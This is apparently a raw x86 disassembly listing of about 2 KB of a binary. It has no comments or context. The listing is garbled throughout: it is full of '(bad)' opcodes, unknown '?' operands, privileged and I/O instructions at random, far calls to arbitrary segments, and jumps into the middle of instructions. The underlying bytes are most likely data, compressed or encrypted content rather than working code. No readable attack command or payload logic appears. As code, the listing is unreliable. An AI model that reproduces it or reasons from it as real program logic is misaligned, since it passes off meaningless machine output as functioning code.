  41f35e:	test   ecx,0xa814587a
  41f364:	mov    WORD PTR [edx+0x2cd996d],es
  41f36a:	mov    dh,0x12
  41f36c:	push   edx
  41f36d:	dec    eax
  41f36e:	mov    bl,al
  41f370:	cmp    al,0x5e
  41f372:	inc    ebp
  41f373:	popa   
  41f374:	fs dec esi
  41f376:	das    
  41f377:	call   0x3539ec78
  41f37c:	pop    esi
  41f37d:	test   esp,edi
  41f37f:	mov    esi,0x140f60b
  41f384:	and    BYTE PTR [edx-0xa],ah
  41f387:	mov    ebp,0x57b641
  41f38c:	pop    es
  41f38d:	and    BYTE PTR [edx-0x3e],0x78
  41f391:	sub    esp,DWORD PTR [esi+0x28]
  41f394:	lods   eax,DWORD PTR ds:[esi]
  41f395:	iret   
  41f396:	and    BYTE PTR [eax-0x4421f0a9],0x86
  41f39d:	mov    ah,BYTE PTR [eax+ecx*2+0x22]
  41f3a1:	inc    esp
  41f3a2:	xchg   ebp,eax
  41f3a3:	pop    edi
  41f3a4:	cmp    eax,DWORD PTR [esi+0x40c4fd91]
  41f3aa:	je     0x41f3bf
  41f3ac:	dec    ecx
  41f3ad:	sbb    BYTE PTR [eax],al
  41f3af:	xchg   esi,eax
  41f3b0:	shl    DWORD PTR [edx-0x1407b04f],cl
  41f3b6:	(bad)  
  41f3b8:	and    DWORD PTR [eax+edi*8],ebx
  41f3bb:	sub    DWORD PTR [eax-0x48f00cb6],edi
  41f3c1:	add    al,dh
  41f3c3:	popf   
  41f3c4:	or     ecx,DWORD PTR [ebx+0x7b]
  41f3c7:	lock das 
  41f3c9:	inc    esi
  41f3ca:	imul   eax,DWORD PTR [ebx+0x33],0xffffffff
  41f3ce:	lea    esi,[ebp-0x17ab3973]
  41f3d4:	sbb    ebx,DWORD PTR [edi+0x4a]
  41f3d7:	jo     0x41f3e4
  41f3d9:	sub    cl,BYTE PTR [ebp+0xfce0147]
  41f3df:	mov    ?,WORD PTR [esp+eiz*2-0x8]
  41f3e3:	mov    ah,0x88
  41f3e5:	and    DWORD PTR [ebp+0x6fbbf485],ecx
  41f3eb:	rcl    eax,0x37
  41f3ee:	nop
  41f3ef:	pop    ecx
  41f3f0:	adc    DWORD PTR [ebp+0x26502b43],0x4d9150b
  41f3fa:	inc    edx
  41f3fb:	pop    ds
  41f3fc:	and    BYTE PTR [edi+0x50],al
  41f3ff:	and    DWORD PTR [edi],eax
  41f401:	cmp    ebp,ebp
  41f403:	dec    ebx
  41f404:	jne    0x41f3a4
  41f406:	jmp    0x41f422
  41f408:	inc    ebx
  41f409:	mov    WORD PTR [ebp+0x3905100a],cs
  41f40f:	pop    ss
  41f410:	dec    eax
  41f411:	or     bl,dl
  41f413:	loope  0x41f45c
  41f415:	(bad)  [edi-0x1c]
  41f418:	dec    eax
  41f419:	repz push ebp
  41f41b:	dec    ebx
  41f41c:	pop    edi
  41f41d:	ret    
  41f41e:	or     al,0x59
  41f420:	cwde   
  41f421:	mov    ebx,0x2aca6ab4
  41f426:	out    0xec,al
  41f428:	test   DWORD PTR [ebx-0x13],ebx
  41f42b:	cmp    edi,DWORD PTR [edi+esi*1]
  41f42e:	sbb    DWORD PTR [eax-0x533aebc3],ebx
  41f434:	ins    DWORD PTR es:[edi],dx
  41f435:	sub    al,0x4f
  41f437:	(bad)  
  41f439:	cmp    al,0x75
  41f43b:	mov    ch,0x50
  41f43d:	cld    
  41f43e:	mov    al,0x24
  41f440:	rol    DWORD PTR [ecx-0x38],0x2c
  41f444:	mov    bh,0x6f
  41f446:	pushf  
  41f447:	neg    BYTE PTR ds:0xfed0a494
  41f44d:	adc    al,0x73
  41f44f:	or     eax,0x5beb3f53
  41f454:	sbb    eax,0x72451fad
  41f459:	add    DWORD PTR [ebp+0xf],esi
  41f45c:	mov    eax,ds:0xb3f79a8d
  41f461:	test   DWORD PTR [ebx-0x9],eax
  41f464:	jmp    0x41f4ab
  41f466:	sub    al,BYTE PTR [ecx]
  41f468:	or     bl,BYTE PTR [ebx-0x9db3877]
  41f46e:	or     al,0x68
  41f470:	sbb    al,0x34
  41f472:	xor    ax,0xecf4
  41f476:	mov    dh,bh
  41f478:	repnz and BYTE PTR [ecx+ecx*1-0x27],dh
  41f47d:	cwde   
  41f47e:	jmp    0x41f4a4
  41f480:	repnz into 
  41f482:	add    dl,BYTE PTR [ebp+ecx*2-0x29b3213a]
  41f489:	(bad)  
  41f48a:	fcmovb st,st(7)
  41f48c:	adc    bl,BYTE PTR [eax+0x24]
  41f48f:	jmp    0x41f49c
  41f491:	mov    ecx,0x8f645d69
  41f496:	xchg   DWORD PTR [edx+0x60],esi
  41f499:	mov    edi,0xa0f40675
  41f49e:	arpl   WORD PTR [edi+0x6d],sp
  41f4a1:	jnp    0x41f468
  41f4a3:	adc    al,0x16
  41f4a5:	push   eax
  41f4a6:	jne    0x41f500
  41f4a8:	mov    ecx,0x3f554790
  41f4ad:	(bad)
  41f4b0:	nop
  41f4b1:	mov    esi,edi
  41f4b3:	cmp    BYTE PTR [ebp+0x4389da85],cl
  41f4b9:	inc    ebx
  41f4ba:	cmp    al,BYTE PTR [edi]
  41f4bc:	push   edx
  41f4bd:	xchg   esp,eax
  41f4be:	add    ecx,DWORD PTR ss:[eax+0x37479571]
  41f4c5:	sub    ecx,DWORD PTR ds:0xe81f438b
  41f4cb:	or     DWORD PTR [eax],ebx
  41f4cd:	pop    esp
  41f4ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4cf:	mov    dl,dh
  41f4d1:	mov    ebp,0x24dcdc13
  41f4d6:	push   edi
  41f4d7:	enter  0xe881,0xe8
  41f4db:	and    esp,DWORD PTR [eax]
  41f4dd:	pop    ss
  41f4de:	xor    bl,ah
  41f4e0:	(bad)  
  41f4e2:	mov    edx,0xfd92e5bb
  41f4e7:	stc    
  41f4e8:	push   eax
  41f4e9:	push   0xc
  41f4eb:	jno    0x41f46d
  41f4ed:	call   0x3b5ed2de
  41f4f2:	or     bl,BYTE PTR [ebp-0x43]
  41f4f5:	or     eax,DWORD PTR [eax]
  41f4f7:	jge    0x41f4b8
  41f4f9:	rol    BYTE PTR [ebp-0x744dd085],1
  41f4ff:	aas    
  41f500:	adc    eax,0x15200c70
  41f505:	mov    edx,0xb825488a
  41f50a:	push   ebx
  41f50b:	adc    ch,BYTE PTR [edi-0x63565bf2]
  41f511:	lds    ebp,FWORD PTR [edx+edx*2+0x481ce8e4]
  41f518:	push   ecx
  41f519:	inc    edx
  41f51a:	in     al,dx
  41f51b:	loopne 0x41f509
  41f51d:	icebp  
  41f51e:	pop    ebx
  41f51f:	mov    eax,0x4d627b90
  41f524:	call   DWORD PTR [ebp+0x644e57a6]
  41f52a:	dec    ecx
  41f52b:	inc    ebp
  41f52d:	fmul   QWORD PTR [ebp+0x55312eb]
  41f533:	ror    DWORD PTR [esi],1
  41f535:	add    DWORD PTR [ecx-0x3337b4d4],edi
  41f53b:	push   ds
  41f53c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f53d:	push   0x2e7f8107
  41f542:	add    esi,DWORD PTR [eiz*1+0x27400912]
  41f549:	cmp    BYTE PTR [esi],bh
  41f54b:	xor    esi,edx
  41f54d:	imul   edx,ebx,0x3b560eff
  41f553:	sub    al,0x79
  41f555:	cli    
  41f556:	adc    BYTE PTR [edx],ch
  41f558:	dec    edi
  41f559:	call   DWORD PTR [edi]
  41f55b:	add    edx,ecx
  41f55d:	or     BYTE PTR [ebx+0x447d3e9d],bl
  41f563:	mov    edx,DWORD PTR [esi+0x4b]
  41f566:	cld    
  41f567:	ja     0x41f568
  41f569:	add    DWORD PTR [ebx],edx
  41f56b:	data16 cmp al,0xdd
  41f56e:	sbb    al,al
  41f570:	mov    DWORD PTR [ebx],edi
  41f572:	fdiv   QWORD PTR [edx]
  41f574:	pop    esp
  41f575:	adc    al,0x93
  41f577:	icebp  
  41f578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f579:	test   eax,0xb910c741
  41f57e:	sbb    al,0xd8
  41f580:	ds or  dl,dh
  41f583:	cld    
  41f584:	push   ebx
  41f585:	(bad)  
  41f586:	imul   eax,esi,0x38
  41f589:	jmp    0x41f5b5
  41f58b:	(bad)  
  41f58c:	pop    edx
  41f58d:	or     esi,DWORD PTR [eax-0x75]
  41f590:	es dec edx
  41f592:	or     ch,ah
  41f594:	mov    es,WORD PTR [esi+0x28e81821]
  41f59a:	jmp    0x41f5a8
  41f59c:	cmc    
  41f59d:	clc    
  41f59e:	xchg   edi,eax
  41f59f:	mov    al,0x82
  41f5a1:	xlat   BYTE PTR ds:[ebx]
  41f5a2:	inc    esp
  41f5a3:	cmp    esi,ebx
  41f5a5:	je     0x41f5dd
  41f5a7:	mov    al,0x5c
  41f5a9:	or     bh,BYTE PTR [esi]
  41f5ab:	pop    ebx
  41f5ac:	jne    0x41f5d4
  41f5ae:	push   0x83edc606
  41f5b3:	test   DWORD PTR [ecx+0x446eab4],esi
  41f5b9:	or     cl,BYTE PTR [eax]
  41f5bb:	mov    DWORD PTR [edi-0x2d],eax
  41f5be:	xor    al,0x8
  41f5c0:	or     al,0xc
  41f5c2:	hlt    
  41f5c3:	sbb    ebx,DWORD PTR [ecx]
  41f5c5:	mov    WORD PTR [edi],gs
  41f5c7:	cdq    
  41f5c8:	enter  0xd720,0x0
  41f5cc:	mov    ecx,DWORD PTR [ecx-0x57cd3ae9]
  41f5d2:	adc    esp,DWORD PTR [edx]
  41f5d4:	pop    ebx
  41f5d5:	sbb    DWORD PTR [edi],edi
  41f5d7:	mov    bl,0xa1
  41f5d9:	mov    eax,0xdb9818dc
  41f5de:	fidivr DWORD PTR [ebp-0x4599e5ef]
  41f5e4:	push   es
  41f5e5:	add    ch,dh
  41f5e7:	test   BYTE PTR [ebx+0x19],bl
  41f5ea:	nop
  41f5eb:	add    ebp,ebp
  41f5ed:	outs   dx,DWORD PTR ds:[si]
  41f5ef:	fs push edi
  41f5f1:	pop    es
  41f5f2:	adc    bl,BYTE PTR [ebx+eax*2+0x21]
  41f5f6:	mov    edi,0xe4d8be79
  41f5fb:	adc    DWORD PTR [edx+0x569dda3a],esp
  41f601:	mov    eax,ds:0xc8e022e8
  41f606:	rcl    DWORD PTR [ebx-0x5deb5ff5],0x1
  41f60d:	aaa    
  41f60e:	ja     0x41f65b
  41f610:	out    0x4f,al
  41f612:	je     0x41f61a
  41f614:	and    ebp,ebx
  41f616:	inc    edx
  41f617:	add    BYTE PTR [edi+0x4],al
  41f61a:	sbb    al,0xfa
  41f61c:	adc    edi,ecx
  41f61e:	cld    
  41f61f:	add    al,BYTE PTR [esi+0x77]
  41f622:	push   esi
  41f623:	ss pop ebx
  41f625:	jl     0x41f5c4
  41f627:	xor    edx,DWORD PTR [edx+ebx*4+0x43]
  41f62b:	call   0x2cf4:0xf0f040fc
  41f632:	and    DWORD PTR [edi+0xc],eax
  41f635:	shl    ah,cl
  41f637:	add    eax,0x73c91865
  41f63c:	mov    BYTE PTR [edi+0x63f0da41],dl
  41f642:	dec    eax
  41f643:	addr16 in al,dx
  41f645:	push   edi
  41f646:	pop    ds
  41f647:	call   0x37d56844
  41f64c:	sbb    DWORD PTR [edi],eax
  41f64e:	fstp   TBYTE PTR [edx-0x39]
  41f651:	sbb    al,0xee
  41f653:	add    BYTE PTR [edi+0x6ae5bf34],0x8
  41f65a:	mov    bl,0x53
  41f65c:	inc    ecx
  41f65d:	inc    ebx
  41f65e:	and    BYTE PTR [eax],cl
  41f660:	shl    DWORD PTR [ecx-0x3fc7440c],0x58
  41f667:	pop    edi
  41f668:	les    eax,FWORD PTR [ecx-0x7229467e]
  41f66e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f66f:	lahf   
  41f670:	sbb    edi,DWORD PTR [edx+esi*2]
  41f673:	clc    
  41f674:	xor    eax,0xca458bb8
  41f679:	outs   dx,DWORD PTR ds:[esi]
  41f67a:	jg     0x41f5fe
  41f67c:	inc    ebp
  41f67d:	ror    BYTE PTR [ebx],cl
  41f67f:	mov    eax,ds:0x96d7a434
  41f684:	loope  0x41f6b0
  41f686:	jb     0x41f68c
  41f688:	pop    edi
  41f689:	in     al,dx
  41f68a:	sub    ecx,eax
  41f68c:	and    DWORD PTR [edx+0xeafbd56],edx
  41f692:	fisttp DWORD PTR [edx]
  41f694:	or     ecx,ebx
  41f696:	loopne 0x41f665
  41f698:	mov    dh,0x99
  41f69a:	xor    al,al
  41f69c:	pop    es
  41f69d:	add    ecx,0x6b87b726
  41f6a3:	push   0xffffff9d
  41f6a5:	sahf   
  41f6a6:	arpl   WORD PTR [ecx+ebx*4],ax
  41f6a9:	pop    esi
  41f6aa:	mov    ecx,0x4e27033e
  41f6af:	ror    DWORD PTR [esi],1
  41f6b1:	test   BYTE PTR [eax],dl
  41f6b3:	sbb    BYTE PTR [ecx],cl
  41f6b5:	xchg   BYTE PTR [esp+edi*1+0x71f8cbe4],dl
  41f6bc:	fistp  DWORD PTR [edi+0x60]
  41f6bf:	gs mov eax,0xc5947eb1
  41f6c5:	es loopne 0x41f70d
  41f6c8:	rcr    bl,0x10
  41f6cb:	dec    esi
  41f6cc:	jmp    0x41f696
  41f6ce:	adc    BYTE PTR [esi-0x1f],0x32
  41f6d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6d3:	mov    al,ds:0x7d80c01a
  41f6d8:	push   es
  41f6d9:	push   ecx
  41f6da:	add    al,0xe4
  41f6dc:	in     al,dx
  41f6dd:	or     al,0xd
  41f6df:	cdq    
  41f6e0:	in     eax,dx
  41f6e1:	add    eax,0x7275cb8b
  41f6e6:	adc    ecx,DWORD PTR [esi+0x22]
  41f6e9:	and    BYTE PTR [edi],bl
  41f6eb:	sbb    al,0x38
  41f6ed:	mov    eax,0x128ec3a0
  41f6f2:	stos   DWORD PTR es:[edi],eax
  41f6f3:	hlt    
  41f6f4:	cmp    BYTE PTR [ebp-0x1bfac37f],ch
  41f6fa:	loopne 0x41f6c3
  41f6fc:	nop
  41f6fd:	imul   ebx,DWORD PTR [ecx+ecx*1],0xffffffa6
  41f701:	push   cs
  41f702:	std    
  41f703:	inc    DWORD PTR [edi]
  41f705:	inc    ecx
  41f706:	pop    esi
  41f707:	sub    ecx,esp
  41f709:	sbb    cl,BYTE PTR [edi]
  41f70b:	mov    bh,0xd0
  41f70d:	cmp    edx,0x14
  41f710:	ja     0x80c3ad4d
  41f716:	adc    ch,BYTE PTR [edx+0x36dc3680]
  41f71c:	ds iret 
  41f71e:	repz mov esp,0xbe96068a
  41f724:	fpatan 
  41f726:	adc    al,0xdd
  41f728:	xor    al,0x9f
  41f72a:	out    0x69,eax
  41f72c:	xor    eax,0xde4d6f52
  41f731:	cmp    ax,0xc9b7
  41f735:	not    DWORD PTR [esi+ebx*1-0x50d821c4]
  41f73c:	retf   0x380b
  41f73f:	int    0xe7
  41f741:	push   es
  41f742:	out    0x1,al
  41f744:	ficomp WORD PTR [edi]
  41f746:	ret    0xfe8
  41f749:	adc    al,BYTE PTR [ebp+0x46]
  41f74c:	rcl    dh,1
  41f74e:	cmp    BYTE PTR ds:0x30019e0c,0x91
  41f755:	fldcw  WORD PTR [eax+0x26f3ec0]
  41f75b:	sahf   
  41f75c:	pop    eax
  41f75d:	call   0xa4040d6b
  41f762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f763:	mov    ebx,0xfc4f2e10
  41f768:	mov    al,0xf
  41f76a:	mov    edi,0xb68d6053
  41f76f:	add    eax,0xc6b99c5d
  41f774:	xor    eax,0xc80d8400
  41f779:	xor    DWORD PTR [ebx],esi
  41f77b:	clc    
  41f77c:	fldcw  WORD PTR [esp+ecx*1]
  41f77f:	data16 add BYTE PTR ds:0x30b0db72,bl
  41f786:	and    eax,0xed8d94d7
  41f78b:	jo     0x41f725
  41f78d:	inc    ecx
  41f78e:	(bad)  [edx+0xf]
  41f791:	enter  0xf0c9,0xf0
  41f795:	push   DWORD PTR [ebx+0xc]
  41f798:	add    al,0x8
  41f79a:	and    DWORD PTR ds:0xfa2c31f9,0xffffffc9
  41f7a1:	adc    BYTE PTR [ecx],bh
  41f7a3:	mov    eax,DWORD PTR [eax+0x48e89534]
  41f7a9:	call   0x2853c45
  41f7ae:	add    ebp,DWORD PTR [eax+ebp*4]
  41f7b1:	jg     0x41f828
  41f7b3:	out    0x83,eax
  41f7b5:	sbb    eax,0xe05549e4
  41f7ba:	data16 jg 0x41f73d
  41f7bd:	cmp    DWORD PTR [edx-0x1fcb5bd9],eax
  41f7c3:	fmul   QWORD PTR [edi]
  41f7c5:	mov    esi,0x6390dce1
  41f7ca:	dec    edi
  41f7cb:	or     eax,esp
  41f7cd:	mov    dh,BYTE PTR [edi]
  41f7cf:	fadd   DWORD PTR [ecx]
  41f7d1:	cmp    DWORD PTR [esi+0x358ad498],esp
  41f7d7:	aam    0x53
  41f7d9:	xor    BYTE PTR [esi],ah
  41f7db:	jo     0x41f7ad
  41f7dd:	push   0xffffffd2
  41f7df:	rcr    ch,1
  41f7e1:	push   es
  41f7e2:	nop
  41f7e3:	out    0x5e,al
  41f7e5:	mov    al,dl
  41f7e7:	int3   
  41f7e8:	cmp    esp,ecx
  41f7ea:	sub    eax,0x758b0391
  41f7ef:	mov    dl,0xe7
  41f7f1:	int    0x30
  41f7f3:	nop
  41f7f4:	not    bh
  41f7f6:	enter  0xca7d,0x44
  41f7fa:	push   edx
  41f7fb:	enter  0x1dfc,0x24
  41f7ff:	stos   BYTE PTR es:[edi],al
  41f800:	clc    
  41f801:	jmp    0x74ca:0xff660702
  41f808:	adc    ebx,ebp
  41f80a:	fild   DWORD PTR [edi]
  41f80c:	push   ds
  41f80d:	inc    ecx
  41f80e:	nop
  41f80f:	push   ebx
  41f810:	and    eax,0x9a40426f
  41f815:	xchg   edi,eax
  41f816:	(bad)  
  41f817:	retf   
  41f818:	adc    ah,al
  41f81a:	pop    esp
  41f81b:	popa   
  41f81c:	cmp    al,0xee
  41f81e:	inc    esi
  41f81f:	je     0x262ce630
  41f825:	(bad)  
  41f826:	mov    edi,0x26a3cae6
  41f82b:	repnz clc 
  41f82d:	adc    ah,ah
  41f82f:	add    DWORD PTR [ebp+0x3cf3debf],eax
  41f835:	int    0xd9
  41f837:	pushf  
  41f838:	loopne 0x41f841
  41f83a:	adc    ebx,edi
  41f83c:	xor    BYTE PTR [edi+ebp*2+0x79],cl
  41f840:	sar    DWORD PTR [esi],cl
  41f842:	iret   
  41f843:	xchg   edx,eax
  41f844:	mov    cl,0xd0
  41f846:	fild   WORD PTR [edi-0x1f]
  41f849:	push   ss
  41f84a:	mov    ?,WORD PTR [ecx-0x31]
  41f84d:	xor    ebp,DWORD PTR [ebp+0x27]
  41f850:	(bad)  
  41f851:	sbb    edi,DWORD PTR [eax]
  41f853:	push   es
  41f854:	push   ebp
  41f855:	mov    es,WORD PTR [ecx-0x238d18c0]
  41f85b:	mov    dl,0xae
  41f85d:	or     al,0x26
  41f85f:	in     al,0x86
  41f861:	add    BYTE PTR [ebx+0x38edbcc0],dl
  41f867:	pop    esi
  41f868:	or     al,0xc3
  41f86a:	aaa    
  41f86b:	mov    esp,0x7300d91f
  41f870:	xchg   ebx,eax
  41f871:	pop    esp
  41f872:	in     al,dx
  41f873:	in     al,0xb8
  41f875:	mov    eax,0x68b4dd45
  41f87a:	pusha  
  41f87b:	and    DWORD PTR [edi],esp
  41f87d:	mov    ah,0x5b
  41f87f:	jb     0x41f853
  41f881:	loope  0x41f87e
  41f883:	mov    esp,0xc33db0b0
  41f888:	pusha  
  41f889:	ja     0x41f8e7
  41f88b:	lods   al,BYTE PTR ds:[esi]
  41f88c:	shr    DWORD PTR [ebp+edi*1+0x7939c6b3],0xb0
  41f894:	mov    edx,DWORD PTR [edx]
  41f896:	pusha  
  41f897:	shr    BYTE PTR cs:[eax-0x1e237b3f],1
  41f89e:	cmp    BYTE PTR [ebp-0x452a5b58],bl
  41f8a4:	or     DWORD PTR [ecx],ebx
  41f8a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8a7:	mov    esi,0xb639a0a4
  41f8ac:	push   edx
  41f8ad:	cdq    
  41f8ae:	nop
  41f8af:	inc    ecx
  41f8b0:	mov    al,ds:0x31ccb79c
  41f8b5:	je     0x41f8c3
  41f8b7:	pushf  
  41f8b8:	xor    DWORD PTR [eax],eax
  41f8ba:	stos   DWORD PTR es:[edi],eax
  41f8bb:	cwde   
  41f8bc:	fwait
  41f8bd:	and    BYTE PTR [edi],0x77
  41f8c0:	jno    0x41f85a
  41f8c2:	jmp    0x41f92c
  41f8c4:	adc    DWORD PTR [edi+esi*1+0x720c7038],0xeba34c94
  41f8cf:	ds pop ebp
  41f8d1:	ret    
  41f8d2:	push   cs
  41f8d3:	jmp    0x47d28974
  41f8d8:	sub    BYTE PTR [edi+0x69],cl
  41f8db:	test   DWORD PTR [eax+0x74c34ebc],ebp
  41f8e1:	mov    dl,BYTE PTR [edx+edx*2]
  41f8e4:	mov    WORD PTR [edx+eiz*1],ds
  41f8e7:	dec    ebp
  41f8e8:	push   cs
  41f8e9:	mov    WORD PTR [ecx],gs
  41f8eb:	xor    cl,ah
  41f8ed:	loopne 0x41f940
  41f8ef:	xchg   esp,edi
  41f8f1:	mov    WORD PTR [edx+0x2275a807],?
  41f8f7:	cdq    
  41f8f8:	mov    al,0x58
  41f8fa:	hlt    
  41f8fb:	or     cl,BYTE PTR [eax+0x48451c5d]
  41f901:	fwait
  41f902:	add    al,0x33
  41f904:	fnsave [edi-0x4eca9eee]
  41f90a:	mov    bh,0xdf
  41f90c:	jb     0x41f90e
  41f90e:	jns    0x41f921
  41f910:	(bad)  
  41f912:	loope  0x41f8d9
  41f914:	loope  0x41f89a
  41f916:	push   edi
  41f917:	in     eax,0x55
  41f919:	or     BYTE PTR [eax],al
  41f91b:	push   esi
  41f91c:	lods   al,BYTE PTR ds:[esi]
  41f91d:	inc    esp
  41f91e:	pop    eax
  41f91f:	pop    esp
  41f920:	inc    edi
  41f921:	shr    esp,cl
  41f923:	push   ebx
  41f924:	mov    edi,0x390a6f81
  41f929:	int3   
  41f92a:	loope  0x41f915
  41f92c:	cmp    esp,ebp
  41f92e:	stos   DWORD PTR es:[edi],eax
  41f92f:	or     BYTE PTR [ebx],ch
  41f931:	fldz   
  41f933:	xor    ch,BYTE PTR [eax+0x539072b7]
  41f939:	leave  
  41f93a:	inc    esi
  41f93b:	loop   0x41f910
  41f93d:	sbb    BYTE PTR [ebp-0x1e],cl
  41f940:	mov    al,dl
  41f942:	loope  0x41f985
  41f944:	loopne 0x41f999
  41f946:	xor    eax,0x108ac1e0
  41f94b:	fs mov bh,0xd5
  41f94e:	or     al,0xe3
  41f950:	fisttp QWORD PTR [eax-0x3d]
  41f953:	add    DWORD PTR [ecx+0x75e2ef64],ebx
  41f959:	shl    BYTE PTR [esp+ebx*2],cl
  41f95c:	inc    esp
  41f95d:	xlat   BYTE PTR ds:[ebx]
  41f95e:	push   eax
  41f95f:	push   edx
  41f960:	loopne 0x41f94e
  41f962:	dec    eax
  41f963:	in     eax,0x10
  41f965:	jb     0x41f947
  41f967:	mul    dl
  41f969:	in     al,0x26
  41f96b:	sub    al,0x95
  41f96d:	adc    edx,DWORD PTR [ebx]
  41f96f:	jecxz  0x41f951
  41f971:	cmp    eax,0x2e131213
  41f976:	nop
  41f977:	aas    
  41f978:	cmp    eax,0x1e4a65de
  41f97d:	(bad)  
  41f97e:	call   0xa9e44ead
  41f983:	imul   edi,DWORD PTR [esi],0xb506f3cf
  41f989:	(bad)  
  41f98b:	adc    ah,ah
  41f98d:	xor    edx,ebx
  41f98f:	jl     0x41f92f
  41f991:	out    0x54,eax
  41f993:	jno    0x41f923
  41f995:	pop    edi
  41f996:	in     eax,0x78
  41f998:	neg    esp
  41f99a:	fbld   TBYTE PTR es:[esi+0x27e54e1e]
  41f9a1:	rcr    esp,0x6
  41f9a4:	iret   
  41f9a5:	dec    esp
  41f9a6:	clc    
  41f9a7:	sahf   
  41f9a8:	clc    
  41f9a9:	adc    ebx,DWORD PTR [esi]
  41f9ab:	xor    ebp,esp
  41f9ad:	cmp    eax,0x57bcd732
  41f9b2:	jb     0x41f946
  41f9b4:	call   0xf474f9c1
  41f9b9:	dec    edi
  41f9ba:	call   0x3d35:0x3d26adb0
  41f9c1:	(bad)
  41f9c7:	inc    ecx
  41f9c8:	ret    0x6236
  41f9cb:	ret    0x413d
  41f9ce:	call   0xe432:0x3d603db0
  41f9d5:	cmp    DWORD PTR ds:0xb6e13460,edi
  41f9db:	cmp    DWORD PTR [esi+0x37],edx
  41f9de:	mov    al,0x36
  41f9e0:	dec    ebp
  41f9e1:	mov    eax,0xe423e45b
  41f9e6:	xor    BYTE PTR gs:[ecx],ah
  41f9e9:	xchg   DWORD PTR [esi+eax*8-0x20],edi
  41f9ed:	movsx  esp,al
  41f9f0:	fsub   QWORD PTR [esi]
  41f9f2:	dec    esp
  41f9f3:	in     al,dx
  41f9f4:	call   0xc23:0xd837dc23
  41f9fb:	adc    eax,DWORD PTR [edx]
  41f9fd:	fdiv   DWORD PTR ds:0x6131d423
  41fa04:	adc    eax,0x5db9d48c
  41fa09:	jnp    0x41fa65
  41fa0b:	sub    BYTE PTR ds:0xcd537f39,0x90
  41fa12:	or     BYTE PTR [edi],0x70
  41fa15:	int3   
  41fa16:	xor    ecx,edx
  41fa18:	xor    al,0x6c
  41fa1a:	int3   
  41fa1b:	adc    DWORD PTR [eax+ebx*4],ebp
  41fa1e:	adc    BYTE PTR [ebx],ah
  41fa20:	cmp    eax,0xd99a4042
  41fa25:	enter  0xec6f,0xc8
  41fa29:	pushf  
  41fa2a:	std    
  41fa2b:	sbb    BYTE PTR [eax+0x23],ch
  41fa2e:	ror    DWORD PTR [esi-0x52],1
  41fa31:	out    0x7,eax
  41fa33:	and    eax,0xcf3cf3e6
  41fa38:	rol    DWORD PTR [edx+0x5e],cl
  41fa3b:	and    DWORD PTR [ebx+eax*8-0x12c8692d],0xf347e6e2
  41fa46:	push   ss
  41fa47:	mov    al,ds:0xcf841007
  41fa4c:	repz cmp al,0x2d
  41fa4f:	dec    edx
  41fa50:	addr16 test bh,ah
  41fa53:	dec    esp
  41fa54:	or     al,0x3
  41fa56:	repnz and al,ah
  41fa59:	les    edx,FWORD PTR [ebx-0x44fdec40]
  41fa5f:	es and eax,eax
  41fa62:	aaa    
  41fa63:	and    esp,ecx
  41fa65:	bound  esp,QWORD PTR [ebx]
  41fa67:	pop    es
  41fa68:	mov    esp,0x1cdd45bc
  41fa6d:	dec    eax
  41fa6e:	pop    ebx
  41fa6f:	xor    BYTE PTR [ecx+0x45],ch
  41fa72:	arpl   WORD PTR [esi],sp
  41fa74:	sub    al,0x79
  41fa76:	(bad)  
  41fa77:	mov    ah,0xa3
  41fa79:	mov    ah,0x8b
  41fa7b:	popa   
  41fa7c:	dec    ebp
  41fa7d:	fsub   DWORD PTR [edx]
  41fa7f:	daa    
  41fa80:	dec    eax
  41fa81:	mov    edi,DWORD PTR ds:0x9384c023
  41fa87:	and    DWORD PTR [eax-0x48],0xffffffac
  41fa8b:	and    eax,DWORD PTR [ecx-0x5338ecf7]
  41fa91:	popf   
  41fa92:	test   al,0x23
  41fa94:	add    edx,DWORD PTR [ebx]
  41fa96:	sub    BYTE PTR es:[eax-0x5bdc5b2b],0xbb
  41fa9e:	xor    eax,0xa0396261
  41faa3:	and    ebx,DWORD PTR [edx]
  41faa5:	cmp    esp,ebx
  41faa7:	xor    DWORD PTR [ebp+0x58],ecx
  41faaa:	and    ebx,DWORD PTR [ecx+esi*2+0x4d61359c]
  41fab1:	cwde   
  41fab2:	and    ebx,DWORD PTR [ebx-0xf]
  41fab5:	pushf  
  41fab6:	es mov esp,0x18d32337
  41fabc:	xchg   esp,eax
  41fabd:	xor    dl,BYTE PTR [ebx]
  41fabf:	es (bad) 
  41fac1:	popf   
  41fac2:	xchg   esp,eax
  41fac3:	and    esi,DWORD PTR [edx]
  41fac5:	xor    BYTE PTR [ecx],bh
  41fac7:	jbe    0x41fb42
  41fac9:	rcl    BYTE PTR [eax-0x70],cl
  41facc:	push   ebx
  41facd:	nop
  41face:	inc    esp
  41facf:	mov    eax,0x69eb08f2
  41fad4:	call   0xd544b569
  41fad9:	cmp    DWORD PTR cs:[esi],esp
  41fadc:	jl     0x41fa76
  41fade:	mov    edx,0xb8ac3d05
  41fae3:	or     al,0x48
  41fae5:	sbb    edx,DWORD PTR [ebx]
  41fae7:	or     DWORD PTR [esi-0x38],esp
  41faea:	rcl    BYTE PTR [ebx+edx*1],1
  41faed:	into   
  41faee:	and    ah,0x71
  41faf1:	or     ecx,DWORD PTR ds:0x3790c0e4
  41faf7:	xor    BYTE PTR [eax],cl
  41faf9:	jb     0x41fad1
  41fafb:	shl    DWORD PTR [ebx],0x80
  41fafe:	sbb    al,BYTE PTR [ecx-0x17]
  41fb01:	pop    ecx
  41fb02:	add    BYTE PTR [edi],0x36
  41fb05:	retf   
  41fb06:	mov    edx,esp
  41fb08:	fist   WORD PTR [edx+0x7f]
  41fb0b:	mov    bl,0x91
  41fb0d:	jg     0x41fae6
  41fb0f:	inc    ebp
  41fb10:	ins    DWORD PTR es:[edi],dx
  41fb11:	jo     0x41fb87
  41fb13:	jns    0x41facd
  41fb15:	dec    ebx
  41fb16:	loope  0x41fb4c
  41fb18:	pop    es
  41fb19:	dec    esi
  41fb1a:	jne    0x41fad3
  41fb1c:	pop    ds
  41fb1d:	pop    edx
  41fb1e:	cmp    ch,0x1
  41fb21:	test   al,0x53
  41fb23:	ins    DWORD PTR es:[edi],dx
  41fb24:	popa   
  41fb25:	and    BYTE PTR [ebx],ch
